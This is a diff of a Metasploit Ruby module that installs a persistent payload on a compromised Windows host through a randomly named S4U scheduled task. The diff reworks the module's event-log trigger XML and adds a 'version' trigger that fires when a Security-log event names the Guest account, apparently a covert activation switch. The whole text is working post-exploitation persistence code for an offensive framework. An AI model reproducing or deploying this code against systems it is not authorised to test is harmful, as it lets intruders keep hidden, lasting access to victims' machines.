@@ -1,3 +1,5 @@
+
+
 ##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
@@ -14,14 +16,14 @@ require 'msf/core/exploit/exe'
 
 class Metasploit3 < Msf::Exploit::Local
 
-  include Msf::Post::Common
+	include Msf::Post::Common
 	include Msf::Post::File
 	include Msf::Post::Windows::Priv
 	include Exploit::EXE
 
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Service for User Persistent Payload Installer',
+			'Name'          => 'Windows Manage User Level Persistent Payload Installer',
 			'Description'   => %q{
 				Creates a scheduled task that will run using service-for-user (S4U).
 				This allows the scheduled task to run even as an unprivileged user
@@ -32,8 +34,8 @@ class Metasploit3 < Msf::Exploit::Local
 			'License'       => MSF_LICENSE,
 			'Author'        =>
 				[
-					'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
 					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
+					'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
 				],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ],
@@ -48,7 +50,7 @@ class Metasploit3 < Msf::Exploit::Local
 			[
 				OptInt.new('FREQUENCY', [false, 'Frequency in minutes to execute', '']),
 				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until task expires', '']),
-				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'logon',['logon', 'lock', 'unlock','schedule', 'boot', 'event']]),
+				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'logon',['logon', 'lock', 'unlock','schedule', 'boot', 'event', 'version']]),
 				OptString.new('REXENAME',[false, 'Name of exe on remote system', '']),
 				OptString.new('PATH',[false, 'PATH to write payload', '']),
 			], self.class)
@@ -80,10 +82,12 @@ class Metasploit3 < Msf::Exploit::Local
 			end
 		end
 
-		if datastore['EVENT_LOG'].empty? or datastore['EVENT_ID'].empty? or datastore['PROVIDER'].empty?
-			print_error("Advanced options EVENT_LOG, EVENT_ID, and PROVIDER required for event")
-			print_error("The properties under any event you wish to trigger on will contain this information")
-			return
+		if datastore['TRIGGER'] == "event"
+			if datastore['EVENT_LOG'].empty? or datastore['PROVIDER'].empty?
+				print_error("Advanced options EVENT_LOG, EVENT_ID, and PROVIDER required for event")
+				print_error("The properties under any event you wish to trigger on will contain this information")
+				return
+			end
 		end
 
 		schname = Rex::Text.rand_text_alpha((rand(8)+6))
@@ -200,7 +204,7 @@ class Metasploit3 < Msf::Exploit::Local
 	# the time trigger.
 	# Returns altered XML
 
-	def create_trigger_event_tags(log, id, provider, xml)
+	def create_trigger_event_tags(log, id, provider, data, tag, xml)
 		domain, user = client.sys.config.getuid.split('\\')
 
 		# Fucked up XML syntax for windows event #{id} in #{log} within the past 15 minutes
@@ -209,9 +213,9 @@ class Metasploit3 < Msf::Exploit::Local
 		temp_xml << "      <Enabled>true</Enabled>\n"
 		temp_xml << "      <Subscription>&lt;QueryList&gt;&lt;Query Id=\"0\" "
 		temp_xml << "Path=\"#{log}\"&gt;&lt;Select Path=\"#{log}\"&gt;"
-		temp_xml << "*[System[Provider[@Name='#{provider}'] and (EventID=#{id})"
-		temp_xml << " and TimeCreated[timediff(@SystemTime) &amp;lt;= 900000]"
-		temp_xml << "]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;"
+		temp_xml << "(EventID=#{id}) and *[System[Provider[@Name='#{provider}']]]" if not id.empty? and not provider.empty?
+		temp_xml << "*[EventData[Data[@Name='#{data}']='#{tag}']]" if not data.empty? and not tag.empty?
+		temp_xml << "&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;"
 		temp_xml << "</Subscription>\n"
 		temp_xml << "    </EventTrigger>"
 
@@ -229,10 +233,7 @@ class Metasploit3 < Msf::Exploit::Local
 		case datastore['TRIGGER']
 			when 'logon'
 				# Trigger based on winlogon event, checks windows license key after logon
-				xml = create_trigger_event_tags("Application","4101","Microsoft-Windows-Winlogon",xml)
-
-			when 'logoff'
-				xml = create_trigger_tags("ConsoleDisconnect", xml)
+				xml = create_trigger_event_tags("Application","4101","Microsoft-Windows-Winlogon", '', '',xml)
 
 			when 'lock'
 				xml = create_trigger_tags("SessionLock", xml)
@@ -248,23 +249,13 @@ class Metasploit3 < Msf::Exploit::Local
 				# 12
 				# Application
 				# level 4
-			xml = create_trigger_event_tags("Application","12","Microsoft-Windows-Kernel-General",xml)
-			#xml = create_trigger_event_tags("System","7036","Service Control Manager",xml)
+				xml = create_trigger_event_tags("Application","12","Microsoft-Windows-Kernel-General", '', '',xml)
 
-			#	temp_xml = "<EventTrigger>\n"
-			#	temp_xml << "      #{create_expire_tag}\n" if not datastore['EXPIRE_TIME'] == 0
-			#	temp_xml << "      <Enabled>true</Enabled>\n"
-			#	temp_xml << "      <Subscription>&lt;QueryList&gt;&lt;Query Id=\"0\" "
-			#	temp_xml << "Path=\"System\"&gt;&lt;Select Path=\"System\"&gt;"
-			#	temp_xml << "*[System[Provider[@Name='Microsoft-Windows-Kernel-General'] "
-			#	temp_xml << "and EventID=12]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;"
-			#	temp_xml << "</Subscription>\n"
-			#	temp_xml << "    </EventTrigger>"
-
-			#	xml = xml.gsub(/<TimeTrigger>.*<\/TimeTrigger>/m, temp_xml)
 			when 'event'
-				xml = create_trigger_event_tags(datastore['EVENT_LOG'],datastore['EVENT_ID'],datastore['PROVIDER'],xml)
+				xml = create_trigger_event_tags(datastore['EVENT_LOG'],datastore['EVENT_ID'],datastore['PROVIDER'], '', '',xml)
 	
+			when 'version'
+				xml = create_trigger_event_tags("Security", "", "", "TargetUserName", "Guest", xml)
 			when 'schedule'
 				# Generate expire tag, insert into XML
 				end_boundary = create_expire_tag
